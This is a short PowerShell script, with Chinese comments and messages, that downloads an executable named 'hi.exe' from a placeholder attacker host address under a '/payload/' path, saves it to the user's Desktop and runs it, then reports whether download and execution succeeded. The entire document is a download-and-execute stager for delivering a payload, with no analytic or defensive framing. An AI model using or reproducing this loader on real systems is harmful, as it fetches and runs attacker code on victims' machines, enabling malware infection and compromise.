$downloadUrl = "http://IP地址/payload/hi.exe" //嵌入攻击者主机IP地址
$downloadPath = "$([Environment]::GetFolderPath('Desktop'))\hi.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
if (Test-Path $downloadPath) {
    $executablePath = $downloadPath
    Start-Process -FilePath $executablePath -NoNewWindow -Wait
    if ($?) {
        Write-Output "文件已成功下载并执行。"
    } else {
        Write-Output "文件执行失败。"
    }
} else {
    Write-Output "文件下载失败。"
}
